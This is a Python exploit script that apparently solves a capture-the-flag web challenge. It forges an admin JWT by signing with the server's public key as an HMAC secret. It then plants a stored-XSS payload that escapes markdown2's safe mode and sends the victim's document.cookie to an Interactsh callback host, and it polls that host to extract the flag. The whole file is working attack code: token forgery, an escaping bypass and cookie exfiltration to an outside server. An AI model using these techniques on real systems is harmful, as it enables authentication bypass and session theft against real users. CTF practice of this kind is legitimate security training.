import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
import urllib.parse

import requests
from interactsh_mcp import InteractshClient

BASE = "http://10.21.232.209:5000"

# ---------------------------------------------------------------- JWT forging

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge_admin(secret: bytes) -> str:
    header  = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": "admin", "role": "admin", "iat": int(time.time())}
    segs = [
        b64url(json.dumps(header,  separators=(",", ":")).encode()),
        b64url(json.dumps(payload, separators=(",", ":")).encode()),
    ]
    si  = ".".join(segs).encode()
    sig = hmac.new(secret, si, hashlib.sha256).digest()
    return ".".join(segs) + "." + b64url(sig)

# ---------------------------------------------------------------- exploit

async def main():
    # 1. open an Interactsh session (public oast.* server by default)
    async with InteractshClient() as client:
        payload_url = "http://" + client.generate_payload()   # <-- add scheme
        print(f"[*] interactsh payload URL: {payload_url}")

        # 2. forge an admin token using the server's public key as HMAC secret
        with open("keys/public2.pem", "rb") as f:
            token = forge_admin(f.read().strip())

        # 3. build the stored-XSS payload that exfils document.cookie
        #    (the code-span breakout survives markdown2's safe_mode="escape")
        xss = (
            '![x](url "`" onerror="this.src=\''
            + payload_url + '?c=\'+encodeURIComponent(document.cookie)//`")'
        )
        print(f"[*] xss payload: {xss}")

        # 4. submit the report as admin
        r = requests.post(
            f"{BASE}/admin/report",
            data={"content": xss},
            cookies={"token": token},
            timeout=5,
        )
        print(f"[*] submit: {r.status_code}")
        r.raise_for_status()

        rid = re.search(r"/report/([0-9a-f]{32})/view", r.text).group(1)
        print(f"[*] report id: {rid}")
        print(f"[*] the bot will visit /report/{rid}/view in a few seconds")
        print("[*] polling interactsh for the callback ...\n")

        # 5. poll for the interaction — this blocks until the bot fires
        deadline = time.time() + 60
        flag = None
        while time.time() < deadline:
            for event in await client.poll():
                print(f"[+] hit! protocol={event.protocol} "
                      f"from={event.remote_address}")
                print(f"    raw_request: {event.raw_request}")

                # extract the query string from the raw HTTP request
                m = re.search(r"GET\s+(\S+)", event.raw_request or "")
                if not m:
                    continue
                path = m.group(1)
                qs   = urllib.parse.urlparse(path).query
                params = urllib.parse.parse_qs(qs)
                cookie = params.get("c", [""])[0]
                print(f"[*] cookie value: {cookie}")

                # cookie = "flag=cysec{...}" — pull the flag out
                fm = re.search(r"flag=([^;]+)", cookie)
                if fm:
                    flag = fm.group(1)
                    print(f"\n[+] FLAG: {flag}")
                    break

                # if the cookie was empty, the bot's flag cookie is
                # httponly or scoped elsewhere — try location.href instead
                if not cookie:
                    print("cookie empty")

            if flag:
                break
            await asyncio.sleep(2)

        if not flag:
            print("no flag yet")


if __name__ == "__main__":
    asyncio.run(main())